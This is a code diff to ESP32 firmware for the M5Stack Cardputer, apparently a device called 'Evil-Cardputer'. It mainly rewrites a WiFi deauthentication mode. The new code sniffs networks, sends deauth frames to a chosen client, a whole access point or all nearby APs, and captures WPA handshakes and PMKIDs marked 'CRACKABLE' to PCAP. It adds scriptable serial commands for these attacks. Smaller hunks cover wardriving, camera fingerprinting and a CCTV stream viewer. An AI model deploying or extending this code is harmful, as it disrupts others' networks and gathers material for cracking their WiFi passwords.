+  for (int i = 0; i < snapN; i++) if (memcmp(snap[i].bssid, la, 6) == 0) { fi = i; break; }
+  char nm[14];
+  if (fi >= 0 && snap[fi].ssid[0]) snprintf(nm, sizeof(nm), "%.12s", snap[fi].ssid);
+  else snprintf(nm, sizeof(nm), "%02X%02X%02X", la[3], la[4], la[5]);
+  char fl[14] = "";
+  if (fi >= 0) {
+    uint8_t m; bool p, cr; dcApHs(snap[fi], &m, &p, &cr);
+    *crackOut = cr;
+    char mm[6]; int k = 0;
+    if (m & 1) mm[k++] = '1'; if (m & 2) mm[k++] = '2'; if (m & 4) mm[k++] = '3'; if (m & 8) mm[k++] = '4';
+    mm[k] = 0;
+    snprintf(fl, sizeof(fl), " M%s%s%s", k ? mm : "-", p ? "+P" : "", cr ? " OK" : "");
+  }
+  snprintf(out, sz, "EAPOL:%lu %s%s", (unsigned long)dcEapolCnt, nm, fl);
+}
 
 void deauthClients() {
-  M5.Display.clear();
+  // Allocate the big AP table + snapshot on the heap only while the mode runs, so
+  // they do not permanently eat RAM (which starved other features like Karma).
+  dcAps = (DcAp*)calloc(DC_MAX_AP, sizeof(DcAp));
+  DcAp* snap = (DcAp*)malloc((size_t)DC_MAX_AP * sizeof(DcAp));
+  dcCapQ  = (DcCap*)calloc(DC_CAPQ, sizeof(DcCap));   // capture ring: heap only while running
+  dcCache = (char(*)[48])calloc(12, 48);              // UI line cache: heap only while running
+  if (!dcAps || !snap || !dcCapQ || !dcCache) {
+    free(dcAps); dcAps = nullptr; free(snap);
+    free(dcCapQ); dcCapQ = nullptr; free((void*)dcCache); dcCache = nullptr;
+    waitAndReturnToMenu("Low memory"); return;
+  }
+  portENTER_CRITICAL(&dcMux); dcNAp = 0; portEXIT_CRITICAL(&dcMux);
+  dcPkts = 0; dcDwellPkts = 0; dcEapolCnt = 0; dcCapHead = dcCapTail = 0; dcCaptureOn = false;
 
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(false, false);
   esp_wifi_set_promiscuous(false);
-  WiFi.disconnect(true);  // Déconnecte et efface les paramètres WiFi enregistrés
-  esp_wifi_stop();
-  esp_wifi_set_promiscuous_rx_cb(NULL);
-  esp_wifi_restore();
-  delay(270); // Petite pause pour s'assurer que tout est terminé
-
-  nvs_flash_init();
-  wifi_init_config_t cfg4 = WIFI_INIT_CONFIG_DEFAULT();
-  esp_wifi_init(&cfg4);
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_STA);;
-  esp_wifi_start();
-  delay(30);
-
-  esp_err_t ret = esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
-  if (ret != ESP_OK) {
-    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
-    return;
-  }
-
-  purgeAllAPData();
-  wifi_scan();
-
-  M5.Lcd.fillRect(0, 14, M5.Lcd.width(), M5.Lcd.height() - 14, BLACK);
+  esp_wifi_set_promiscuous_rx_cb(&dcCb);
+  wifi_promiscuous_filter_t filt;
+  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
+  esp_wifi_set_promiscuous_filter(&filt);
   esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
+  uint8_t ch = 1;
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
 
-  M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-  M5.Lcd.setCursor(M5.Display.width() - 30, 1);
-  M5.Lcd.printf("D:");
-  if (isDeauthActive) {
-    M5.Lcd.print("1");
-  } else {
-    M5.Lcd.print("0");
-  }
   enterDebounce();
-
-  unsigned long lastKeyPressTime = 0;
-  const unsigned long debounceDelay = 1000;
-
-  unsigned long lastScanTime = millis();
-  unsigned long lastChannelChange = millis();
-  unsigned long lastClientPurge = millis();
-  unsigned long lastTimeUpdate = millis();
-  unsigned long lastPrintTime = millis();
+  int  vis[DC_MAX_AP]; int nVis = 0;
+  int  hvis[DC_MAX_AP]; int nCap = 0;    // APs that carry captured handshake data
+  uint8_t snapN = 0;
+  int  view = 0;                         // 0 = AP list, 1 = client list, 2 = captures
+  int  apSel = 0, apTop = 0, cliSel = 0, cliTop = 0, curAp = 0, capSel = 0, capTop = 0;
+  int  tgtMode = 0;                      // 0 = off, 1 = single AP, 2 = all APs
+  int  tgtAp = -1, tgtCli = -1, rr = 0;
+  bool armed = false;
+  uint32_t lastHop = 0, lastPps = 0, lastNav = 0, lastDeauth = 0, pps = 0;
+  bool deep = false;        // false = FAST hop (250ms), true = DEEP dwell (1.8s/ch)
+  const int rows = 8;
+  char buf[48];
+  char sbuf[80]; uint8_t sn = 0; bool wantExit = false;   // serial command line buffer
+  dcCacheReset();
+  Serial.println(F("[DeauthClients] serial control ready - type 'help'"));
 
   while (true) {
-    esp_task_wdt_reset();
-    vTaskDelay(pdMS_TO_TICKS(10));
-    M5.update();
-    cardUpdate();
+    M5.update(); cardUpdate();
+    uint32_t now = millis();
 
-    unsigned long currentPressTime = millis();
-    unsigned long currentTimeAuto = millis();
+    portENTER_CRITICAL(&dcMux);
+    snapN = dcNAp;
+    if (snapN) memcpy(snap, dcAps, sizeof(DcAp) * snapN);
+    portEXIT_CRITICAL(&dcMux);
 
-    if (currentTimeAuto - lastTimeUpdate >= 2000) {
-      unsigned long timeToNextScan = scanInterval - (currentTimeAuto - lastScanTime);
-      unsigned long timeToNextPurge = clientPurgeInterval - (currentTimeAuto - lastClientPurge);
-      unsigned long timeToNextChannelChange = channelChangeInterval - (currentTimeAuto - lastChannelChange);
-      Serial.println(F("-----------------"));
-      Serial.print(F("Time to next scan: "));
-      Serial.print(timeToNextScan / 1000);
-      Serial.println(F(" seconds"));
+    nVis = 0;                            // only APs that have >=1 client
+    for (int i = 0; i < snapN; i++) if (snap[i].nCli > 0) vis[nVis++] = i;
+    if (apSel >= nVis) apSel = nVis ? nVis - 1 : 0;
 
-      Serial.print(F("Time to next purge: "));
-      Serial.print(timeToNextPurge / 1000);
-      Serial.println(F(" seconds"));
+    nCap = 0;                            // APs with any captured handshake fragment
+    for (int i = 0; i < snapN; i++) { uint8_t m; bool p, cr; dcApHs(snap[i], &m, &p, &cr); if (m || p) hvis[nCap++] = i; }
+    if (capSel >= nCap) capSel = nCap ? nCap - 1 : 0;
 
-      Serial.print(F("Time to next channel change: "));
-      Serial.print(timeToNextChannelChange / 1000);
-      Serial.println(F(" seconds"));
-      Serial.println(F("-----------------"));
-      lastTimeUpdate = currentTimeAuto;
-    }
-    if (kp('d') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
-      isDeauthActive = !isDeauthActive;
-      Serial.println(isDeauthActive ? "Deauther activated !" : "Deauther disabled !");
-      M5.Lcd.setCursor(M5.Display.width() - 30, 1);
-      M5.Lcd.printf("D:%d", isDeauthActive ? 1 : 0);
-      lastKeyPressTime = currentPressTime;
-    }
-
-    if ((kp(KEY_ENTER) || kp(KEY_BACKSPACE)) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
-      esp_wifi_set_promiscuous(false);
-      esp_wifi_set_promiscuous_rx_cb(NULL);
-      break;
-    }
-
-    if (kp('f') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
-      if (!isDeauthFast) {
-        isDeauthFast = true;
-        scanInterval = 30000; // interval of deauth and scanning network fast
-        channelChangeInterval = 5000; // interval of channel switching fast
-        clientPurgeInterval = 60000; //interval of clearing the client to exclude no more connected client or ap that not near anymore fast
-        deauthWaitingTime = 5000;
-        nbDeauthSend = 5;
-        Serial.println(F("Fast mode enabled !"));
-        M5.Lcd.setCursor(M5.Display.width() - 40, 1);
-        M5.Lcd.printf("F");
-      } else {
-        isDeauthFast = false;
-        scanInterval = 90000; // interval of deauth and scanning network
-        channelChangeInterval = 15000; // interval of channel switching
-        clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore
-        deauthWaitingTime = 7500;
-        nbDeauthSend = 10;
-        Serial.println(F("Fast mode disabled !"));
-        M5.Lcd.setCursor(M5.Display.width() - 40, 1);
-        M5.Lcd.printf(" ");
+    // ---- channel ----
+    if (!armed) {
+      if (view == 0) {
+        uint32_t el = now - lastHop;
+        uint32_t minD = deep ? 700 : 250;     // always dwell at least this long
+        uint32_t maxD = deep ? 4000 : 250;    // never linger past this
+        if (el >= minD) {
+          bool busy = dcDwellPkts >= (el / 40);   // ~>=25 pkts/s on this channel -> stay
+          if (!busy || el >= maxD) { lastHop = now; dcDwellPkts = 0; ch = (ch % 13) + 1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); }
+        }
       }
-      lastKeyPressTime = currentPressTime;
+      else { uint8_t c = snap[curAp].channel; if (c >= 1 && c <= 13 && ch != c) { ch = c; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
+    } else if (tgtMode == 1 && tgtAp >= 0 && tgtAp < snapN) {
+      uint8_t c = snap[tgtAp].channel; if (c >= 1 && c <= 13 && ch != c) { ch = c; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); }
     }
 
-    // Lancement d'un scan et deauthbroadcast toutes les 60 secondes
-    if (currentTimeAuto - lastScanTime >= scanInterval) {
-      if (isDeauthActive) {
-        sendBroadcastDeauths();  // Déconnexion broadcast
+    if (now - lastPps >= 1000) { lastPps = now; pps = dcPkts; dcPkts = 0; }
+
+    while (dcCapTail != dcCapHead) {     // deferred PCAP writes (safe app-task ctx)
+      DcCap& c = dcCapQ[dcCapTail];
+      enregistrerDansFichierPCAP((const wifi_promiscuous_pkt_t*)c.raw, c.beacon);
+      dcCapTail = (dcCapTail + 1) % DC_CAPQ;
+    }
+
+    // ---- non-blocking deauth ----
+    if (armed) {
+      if (tgtMode == 2) {                               // ALL: round-robin every box
+        if (nVis > 0 && now - lastDeauth >= 100) {
+          lastDeauth = now;
+          rr = (rr + 1) % nVis;
+          DcAp& A = snap[vis[rr]];
+          if (A.channel >= 1 && A.channel <= 13 && ch != A.channel) { ch = A.channel; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); }
+          uint8_t bc[6]; memset(bc, 0xFF, 6); dcTxDeauth(bc, A.bssid, A.bssid);
+          for (int i = 0; i < A.nCli; i++) { dcTxDeauth(A.bssid, A.cli[i].mac, A.bssid); dcTxDeauth(A.cli[i].mac, A.bssid, A.bssid); }
+        }
+      } else if (tgtMode == 1 && tgtAp >= 0 && tgtAp < snapN && now - lastDeauth >= 80) {
+        lastDeauth = now;
+        DcAp& A = snap[tgtAp];
+        if (tgtCli >= 0 && tgtCli < A.nCli) {
+          // Single client selected: only its two directional frames. No broadcast
+          // disassoc here, so the rest of the box stays connected.
+          dcTxDeauth(A.bssid, A.cli[tgtCli].mac, A.bssid);
+          dcTxDeauth(A.cli[tgtCli].mac, A.bssid, A.bssid);
+        } else {
+          // Whole box: broadcast disassoc-all + every client in both directions.
+          uint8_t bc[6]; memset(bc, 0xFF, 6);
+          dcTxDeauth(bc, A.bssid, A.bssid);
+          for (int i = 0; i < A.nCli; i++) { dcTxDeauth(A.bssid, A.cli[i].mac, A.bssid); dcTxDeauth(A.cli[i].mac, A.bssid, A.bssid); }
+        }
       }
-      esp_wifi_set_promiscuous_rx_cb(NULL);
-      wifi_scan();  // Lancement du scan
-      esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
-      lastScanTime = currentTimeAuto;
-      lastChannelChange = currentTimeAuto;  // Réinitialisation du timer pour éviter les conflits avec le changement de canal
     }
 
-    // Purge des clients toutes les 5 minutes, assuré de ne pas coincider avec le scan
-    if (currentTimeAuto - lastClientPurge >= clientPurgeInterval && currentTimeAuto - lastScanTime >= 1000) {
-      purgeAllAPData();  // Purge des données
-      lastClientPurge = currentTimeAuto;
+    // ---- input ----
+    if (kp(KEY_BACKSPACE)) {
+      keyRelease();
+      if (view == 1) { view = 0; armed = false; tgtMode = 0; tgtAp = -1; tgtCli = -1; dcCaptureOn = false; dcCacheReset(); }
+      else if (view == 2) { view = 0; dcCacheReset(); }
+      else break;
+    }
+    if (now - lastNav > 140) {
+      if (kp(',') || kp(';')) {
+        if (view == 0) { if (apSel > 0) apSel--; }
+        else if (view == 2) { if (capSel > 0) capSel--; }
+        else { if (cliSel > 0) cliSel--; }
+        lastNav = now;
+      }
+      else if (kp('.') || kp('/')) {
+        if (view == 0) { if (apSel < nVis - 1) apSel++; }
+        else if (view == 2) { if (capSel < nCap - 1) capSel++; }
+        else { int nc = snap[curAp].nCli; if (cliSel < nc - 1) cliSel++; }
+        lastNav = now;
+      } else if (kp('d')) {
+        lastNav = now;
+        if (view == 0 && nVis > 0) { armed = !(armed && tgtMode == 1); tgtMode = armed ? 1 : 0; tgtAp = armed ? vis[apSel] : -1; tgtCli = -1; dcCaptureOn = armed; }
+        else if (view == 1) { armed = !(armed && tgtMode == 1); tgtMode = armed ? 1 : 0; tgtAp = armed ? curAp : -1; dcCaptureOn = armed; }
+      } else if (kp('a')) {
+        lastNav = now;
+        if (view == 0) { if (armed && tgtMode == 2) { armed = false; tgtMode = 0; dcCaptureOn = false; } else { armed = true; tgtMode = 2; tgtAp = -1; tgtCli = -1; dcCaptureOn = true; } }
+        else if (view == 1) { tgtCli = -1; }            // client view: target all clients
+      } else if (kp('f')) { deep = !deep; lastNav = now; }   // toggle FAST / DEEP scan
+      else if (kp('h')) { if (view == 0) { view = 2; capSel = 0; capTop = 0; dcCacheReset(); } lastNav = now; }   // captures page
+    }
+    if (kp(KEY_ENTER)) {
+      keyRelease();
+      if (view == 0 && nVis > 0) { curAp = vis[apSel]; view = 1; cliSel = 0; cliTop = 0; tgtCli = -1; dcCacheReset(); }
+      else if (view == 2 && nCap > 0) { curAp = hvis[capSel]; view = 1; cliSel = 0; cliTop = 0; tgtCli = -1; dcCacheReset(); }
+      else if (view == 1) { tgtCli = (tgtCli == cliSel) ? -1 : cliSel; }
     }
 
-    // Gestion de l'affichage des connexions toutes les 2 secondes
-    if (currentTimeAuto - lastPrintTime >= 2000) { // 2 seconde
-      print_connections();
-      lastPrintTime = currentTimeAuto;
+    // ---- serial control (headless / scriptable): same actions as the keys ----
+    while (Serial.available()) {
+      char c = Serial.read();
+      if (c == '\r') continue;
+      if (c != '\n') { if (sn < sizeof(sbuf) - 1) sbuf[sn++] = c; continue; }
+      sbuf[sn] = 0; sn = 0;
+      char* s = sbuf; while (*s == ' ') s++;
+      int ai, ci;
+      if (!strcmp(s, "help")) {
+        Serial.println(F("cmds: aps | caps | clients <ap> | ap <n> | client <ap> <cli> | all | stop | fast | deep | status | exit"));
+      } else if (!strcmp(s, "aps") || !strcmp(s, "list")) {
+        Serial.printf("APs with clients (%d):\n", nVis);
+        for (int i = 0; i < nVis; i++) { DcAp& A = snap[vis[i]]; uint8_t m; bool p, cr; dcApHs(A, &m, &p, &cr);
+          Serial.printf("  [%d] %-20s ch%-2d cli%-2d %ddBm %s\n", vis[i], A.ssid[0] ? A.ssid : "<hidden>", A.channel, A.nCli, A.rssi, cr ? "CRACKABLE" : (m || p ? "hs" : "")); }
+      } else if (!strcmp(s, "caps")) {
+        Serial.printf("Captures (%d):\n", nCap);
+        for (int i = 0; i < nCap; i++) { DcAp& A = snap[hvis[i]]; uint8_t m; bool p, cr; dcApHs(A, &m, &p, &cr);
+          Serial.printf("  [%d] %-20s ch%-2d M%s%s%s%s%s\n", hvis[i], A.ssid[0] ? A.ssid : "<hidden>", A.channel,
+            (m & 1) ? "1" : "", (m & 2) ? "2" : "", (m & 4) ? "3" : "", p ? " PMKID" : "", cr ? "  CRACKABLE" : ""); }
+      } else if (!strncmp(s, "clients", 7) && sscanf(s + 7, "%d", &ai) == 1 && ai >= 0 && ai < snapN) {
+        DcAp& A = snap[ai]; Serial.printf("Clients of [%d] %s (%d):\n", ai, A.ssid[0] ? A.ssid : "<hidden>", A.nCli);
+        for (int i = 0; i < A.nCli; i++) { DcClient& C = A.cli[i]; bool crk = C.pmkid || ((C.eapol & 2) && ((C.eapol & 1) || (C.eapol & 4)));
+          Serial.printf("  [%d] %02X:%02X:%02X:%02X:%02X:%02X %-10s %ddBm M%s%s%s%s %s\n", i,
+            C.mac[0], C.mac[1], C.mac[2], C.mac[3], C.mac[4], C.mac[5], dcVendor(C.mac), C.rssi,
+            (C.eapol & 1) ? "1" : "", (C.eapol & 2) ? "2" : "", (C.eapol & 4) ? "3" : "", C.pmkid ? "P" : "", crk ? "CRACKABLE" : ""); }
+      } else if (!strncmp(s, "ap ", 3) && sscanf(s + 3, "%d", &ai) == 1 && ai >= 0 && ai < snapN) {
+        armed = true; tgtMode = 1; tgtAp = ai; tgtCli = -1; dcCaptureOn = true;
+        Serial.printf("deauth AP [%d] %s\n", ai, snap[ai].ssid[0] ? snap[ai].ssid : "<hidden>");
+      } else if (!strncmp(s, "client ", 7) && sscanf(s + 7, "%d %d", &ai, &ci) == 2 && ai >= 0 && ai < snapN && ci >= 0 && ci < snap[ai].nCli) {
+        armed = true; tgtMode = 1; tgtAp = ai; tgtCli = ci; dcCaptureOn = true;
+        Serial.printf("deauth client [%d:%d]\n", ai, ci);
+      } else if (!strcmp(s, "all")) { armed = true; tgtMode = 2; tgtAp = -1; tgtCli = -1; dcCaptureOn = true; Serial.println(F("deauth ALL")); }
+      else if (!strcmp(s, "stop")) { armed = false; tgtMode = 0; dcCaptureOn = false; Serial.println(F("deauth stopped")); }
+      else if (!strcmp(s, "fast")) { deep = false; Serial.println(F("scan FAST")); }
+      else if (!strcmp(s, "deep")) { deep = true; Serial.println(F("scan DEEP")); }
+      else if (!strcmp(s, "status")) { Serial.printf("view%d armed%d mode%d tgtAp%d tgtCli%d scan=%s APs%d caps%d EAPOL%lu\n", view, armed, tgtMode, tgtAp, tgtCli, deep ? "DEEP" : "FAST", nVis, nCap, (unsigned long)dcEapolCnt); }
+      else if (!strcmp(s, "exit") || !strcmp(s, "quit")) { Serial.println(F("exit")); wantExit = true; }
+      else if (s[0]) Serial.println(F("? type 'help'"));
+    }
+    if (wantExit) break;
+
+    // ---- render (line-cached, no full-frame clear) ----
+    if (view == 0) {
+      const char* mode = armed ? (tgtMode == 2 ? "ALL" : "1AP") : (deep ? "DEEP" : "FAST");
+      snprintf(buf, sizeof(buf), "SNIFF ch%-2d box:%-2d PPS:%-4lu %s", ch, nVis, (unsigned long)pps, mode);
+      dcDrawLine(0, 2, armed ? TFT_RED : TFT_GREEN, buf);
+      bool crk; dcEapolLine(buf, sizeof(buf), snap, snapN, &crk);
+      dcDrawLine(1, 15, crk ? TFT_GREEN : (dcLastEapolSet ? TFT_GREENYELLOW : TFT_DARKGREY), buf);
+      if (apTop > apSel) apTop = apSel;
+      if (apSel >= apTop + rows) apTop = apSel - rows + 1;
+      for (int r = 0; r < rows; r++) {
+        int li = apTop + r;
+        if (li < nVis) {
+          DcAp& A = snap[vis[li]];
+          bool cur = (li == apSel);
+          const char* nm = A.ssid[0] ? A.ssid : "<hidden>";
+          uint8_t _m; bool _p, _cr; dcApHs(A, &_m, &_p, &_cr);
+          const char* tag = _cr ? " HS!" : ((_m || _p) ? " hs" : "");
+          snprintf(buf, sizeof(buf), "%c%-12.12s c%-2d n%-2d %d%s", cur ? '>' : ' ', nm, A.channel, A.nCli, A.rssi, tag);
+          dcDrawLine(2 + r, 28 + r * 12, _cr ? TFT_GREEN : (cur ? TFT_WHITE : TFT_LIGHTGREY), buf);
+        } else dcDrawLine(2 + r, 28 + r * 12, TFT_BLACK, "");
+      }
+      dcDrawLine(10, 125, TFT_CYAN, nVis ? "ENTcli h:cap d:1AP a:ALL f:spd DEL" : "listening... (only boxes w/ clients)");
+    } else if (view == 2) {
+      snprintf(buf, sizeof(buf), "CAPTURES %d  (handshake detail)", nCap);
+      dcDrawLine(0, 2, TFT_GREENYELLOW, buf);
+      dcDrawLine(1, 15, TFT_BLACK, "");
+      if (capTop > capSel) capTop = capSel;
+      if (capSel >= capTop + rows) capTop = capSel - rows + 1;
+      for (int r = 0; r < rows; r++) {
+        int li = capTop + r;
+        if (li < nCap) {
+          DcAp& A = snap[hvis[li]];
+          bool cur = (li == capSel);
+          uint8_t m; bool p, cr; dcApHs(A, &m, &p, &cr);
+          char mm[6]; int k = 0;
+          if (m & 1) mm[k++] = '1'; if (m & 2) mm[k++] = '2'; if (m & 4) mm[k++] = '3'; if (m & 8) mm[k++] = '4';
+          mm[k] = 0;
+          const char* nm = A.ssid[0] ? A.ssid : "<hidden>";
+          snprintf(buf, sizeof(buf), "%c%-11.11s c%-2d M%s%s%s", cur ? '>' : ' ', nm, A.channel, k ? mm : "-", p ? "P" : "", cr ? " OK" : "");
+          dcDrawLine(2 + r, 28 + r * 12, cr ? TFT_GREEN : (cur ? TFT_WHITE : TFT_LIGHTGREY), buf);
+        } else dcDrawLine(2 + r, 28 + r * 12, TFT_BLACK, "");
+      }
+      dcDrawLine(10, 125, TFT_CYAN, nCap ? "ENTER clients  DEL back" : "no handshake yet  DEL back");
+    } else {
+      DcAp& A = snap[curAp < snapN ? curAp : 0];
+      const char* nm = A.ssid[0] ? A.ssid : "<hidden>";
+      const char* mode = !armed ? "" : (tgtCli >= 0 ? "DEAUTH1" : "DEAUTHall");
+      snprintf(buf, sizeof(buf), "%-13.13s ch%-2d n%-2d %s", nm, A.channel, A.nCli, mode);
+      dcDrawLine(0, 2, armed ? TFT_RED : TFT_GREEN, buf);
+      bool crk; dcEapolLine(buf, sizeof(buf), snap, snapN, &crk);
+      dcDrawLine(1, 15, crk ? TFT_GREEN : (dcLastEapolSet ? TFT_GREENYELLOW : TFT_DARKGREY), buf);
+      if (cliTop > cliSel) cliTop = cliSel;
+      if (cliSel >= cliTop + rows) cliTop = cliSel - rows + 1;
+      for (int r = 0; r < rows; r++) {
+        int li = cliTop + r;
+        if (li < A.nCli) {
+          DcClient& C = A.cli[li];
+          bool cur = (li == cliSel);
+          bool tg  = (tgtCli == li) || (tgtCli == -1 && armed);
+          char hs[8]; int hk = 0;
+          if (C.eapol & 1) hs[hk++] = '1'; if (C.eapol & 2) hs[hk++] = '2';
+          if (C.eapol & 4) hs[hk++] = '3'; if (C.eapol & 8) hs[hk++] = '4';
+          if (C.pmkid) hs[hk++] = 'P'; hs[hk] = 0;
+          bool crk = C.pmkid || ((C.eapol & 2) && ((C.eapol & 1) || (C.eapol & 4)));
+          snprintf(buf, sizeof(buf), "%c%02X%02X%02X %-6.6s %d %s%s",
+            cur ? '>' : ' ', C.mac[3], C.mac[4], C.mac[5], dcVendor(C.mac), C.rssi,
+            hk ? hs : "-", tg ? " *" : "");
+          dcDrawLine(2 + r, 28 + r * 12, crk ? TFT_GREEN : (cur ? TFT_WHITE : TFT_LIGHTGREY), buf);
+        } else dcDrawLine(2 + r, 28 + r * 12, TFT_BLACK, "");
+      }
+      dcDrawLine(10, 125, TFT_CYAN, "ENTER 1cli  a all  d deauth  DEL back");
     }
 
-
-    // Changement de channel toutes les 15 secondes, seulement si un scan n'est pas en cours
-    if (currentTimeAuto - lastChannelChange >= channelChangeInterval && currentTimeAuto - lastScanTime >= 1000) {
-      changeChannel();
-      lastChannelChange = currentTimeAuto;
-    }
-
+    delay(30);
   }
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  portENTER_CRITICAL(&dcMux); dcNAp = 0; portEXIT_CRITICAL(&dcMux);
+  { DcAp* tmp = dcAps; dcAps = nullptr; free(tmp); }   // null the global before freeing
+  { DcCap* q = dcCapQ; dcCapQ = nullptr; free(q); }    // (promiscuous already off above: no cb can run)
+  { char (*c)[48] = dcCache; dcCache = nullptr; free((void*)c); }
+  free(snap);
   waitAndReturnToMenu("Stopping Sniffing...");
 }
-
 
 // Sniff and deauth clients end
 
@@ -13601,8 +14319,13 @@ void connectWifi(int networkIndex) {
   if (getWifiSecurity(networkIndex) == "Open") {
     Serial.println(F("Network is open, no password required."));
     if (connectToWiFi(nameSSID, "")) {
-      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
       ssid = nameSSID; // Stocke le SSID sélectionné
+      password = "";
+      if (confirmPopup("Save this network?")) {
+        saveConfigString("wifi_ssid", nameSSID);
+        saveConfigString("wifi_password", "");
+      }
+      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
     } else {
       waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
     }
@@ -13629,7 +14352,12 @@ void connectWifi(int networkIndex) {
   typedPassword = getUserInput(false, true);
   Serial.print(F("Attempting to connect to WiFi with password: ")); Serial.println(typedPassword);
   if (connectToWiFi(nameSSID, typedPassword)) {
-    waitAndReturnToMenu("Connected to WiFi: " + nameSSID); ssid = nameSSID; password = typedPassword;
+    ssid = nameSSID; password = typedPassword;
+    if (confirmPopup("Save this network?")) {
+      saveConfigString("wifi_ssid", nameSSID);
+      saveConfigString("wifi_password", typedPassword);
+    }
+    waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
   } else {
     waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
   }
@@ -15792,7 +16520,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.5.7,model=Cardputer,release=v1.5.7,"
+  "WigleWifi-1.4,appRelease=v1.5.8,model=Cardputer,release=v1.5.8,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -16124,12 +16852,24 @@ void stopEspNow() {
 void startWardivingMaster() {
     Serial.println(F("Entering Wardriving Master mode..."));
     WiFi.mode(WIFI_STA);
+    // A saved STA auto-reconnect locks the radio to the joined AP's channel, so
+    // esp_wifi_set_channel() below returns OK but silently keeps that channel
+    // (observed: ch11) and the master never sits on the slave's ch1 TX channel.
+    // Drop the connection and disable auto-reconnect so ch1 can actually stick.
+    WiFi.setAutoReconnect(false);
+    WiFi.disconnect(false, false); // disconnect only; keep saved creds in NVS
+    delay(50);
 
     if (esp_now_init() != 0) {
         Serial.println(F("Error initializing ESP-NOW"));
         return;
     }
     esp_now_register_recv_cb(OnDataRecv);
+    // The C5 slave always transmits its wardriving ESP-NOW frames on channel 1
+    // (kEspNowTxChannel). Pin the master to ch1 so it is on the slave's TX
+    // channel; without this the radio keeps whatever channel the previous op
+    // (e.g. the C5 Serial menu's channel hopping) left it on and receives nothing.
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
     updateFileName();
     printHeader();
 
@@ -16431,6 +17171,7 @@ void sniffMaster(){
 // Wifi Visualizer
 ============================================================================================================================
 */
+
 void wifiVisualizer() {
     bool inVisualizer = true;
 
@@ -24617,6 +25358,12 @@ bool httpRequest(IPAddress ip, uint16_t port, const char* path, String& respHdr,
   String fullUrl = String(protoFromPort(port)) + "://" + ip.toString() + ":" + port + path;
   httpBeginAuto(http, cli, tls, fullUrl);
 
+  // HTTPClient only retains headers registered before the request: without this,
+  // http.header("Server") is always empty and isCamera()'s brand fingerprint by
+  // Server header is dead code.
+  const char* hdrKeys[] = {"Server"};
+  http.collectHeaders(hdrKeys, 1);
+
   int code = http.GET();
   if (code < 0) { http.end(); return false; }
 
@@ -25265,7 +26012,9 @@ bool isCamera(IPAddress ip, const std::vector<uint16_t>& ports, String& brandOut
   // 1) Détection via HTTP
   for (uint16_t p : ports) {
     String server, body;
-    if (httpRequest(ip, p, "/", server, body)) {
+    // Skip the HTTP probe on non-HTTP ports (RTSP/RTMP/37777): a GET there just
+    // burns the full timeout before falling through to the RTSP branch below.
+    if (isHttpLikePort(p) && httpRequest(ip, p, "/", server, body)) {
       String lowServer = server; lowServer.toLowerCase();
       String lowBody   = body;   lowBody.toLowerCase();
 
@@ -25936,6 +26685,8 @@ static const uint32_t STREAM_READY_TIMEOUT_MS   = 5000; // 5s: aucune réponse/h
 static const uint32_t STREAM_NO_DATA_TIMEOUT_MS = 5000; // 5s: plus de data en lecture
 
 static const size_t   IO_CHUNK = 3840;
+static const size_t   MJPEG_MAX_FRAME      = 512 * 1024; // sanity cap: a bogus/huge Content-Length won't be read forever
+static const uint32_t MJPEG_FRAME_DEADLINE_MS = 8000;    // total time budget for one frame (else drop + reconnect)
 
 // fichiers temporaires
 static const char* SD_TMP_DIR      = "/evil/tmp";
@@ -26351,7 +27102,13 @@ bool runMenu() {
 
 
 // ---------- MJPEG VIEWER (timeouts 5s, sans goto) ----------
-bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* pathB) {
+// Explicit forward decl: suppresses the arduino-cli auto-prototyper, which would
+// otherwise emit an illegal `static extern "C"` prototype for this static function.
+static bool mjpegViewerFS_impl(const char* url, fs::FS& fs, const char* pathA, const char* pathB, char* line, uint8_t* buf);
+// Impl receives the two scratch buffers from the wrapper below, which owns their
+// heap lifetime. They were permanent statics (4.6 KB in .bss); now heap-allocated
+// only while a stream is being viewed, and off the 8 KB loop-task stack as before.
+static bool mjpegViewerFS_impl(const char* url, fs::FS& fs, const char* pathA, const char* pathB, char* line, uint8_t* buf) {
   // true -> revenir au menu ; false -> changer de flux (switch interne)
   UrlParts up;
   if (!parseUrl(String(url), up) || up.https) return true;
@@ -26385,13 +27142,12 @@ bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* p
     req += "Connection: keep-alive\r\n\r\n";
     client.print(req);
 
-    char line[768];
     bool reconnect = false;
 
     // ---- Status line (deadline 5s) ----
     bool haveStatus = false;
     while (!haveStatus) {
-      if (readLineCCTV(client, line, sizeof(line)) > 0) {
+      if (readLineCCTV(client, line, 768) > 0) {
         haveStatus = true;
         break;
       }
